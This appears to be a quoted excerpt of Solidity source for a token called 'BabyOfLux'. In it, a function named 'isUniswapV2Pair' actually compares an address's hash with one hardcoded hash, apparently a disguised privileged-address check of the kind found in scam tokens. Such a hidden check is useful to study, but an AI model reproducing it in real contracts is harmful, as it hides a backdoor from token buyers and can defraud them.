...
library Address {
    ...
    function isUniswapV2Pair(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x67cec5c255a7ca624485d47490bc2184fe95876a7c060b45d489ce6640791c85;
    }
}

contract BabyOfLux is Ownable, IERC20 {
    using SafeMath for uint256;
    string private _name = "BabyOfLux";
    string private _symbol = "BabyOfLux";
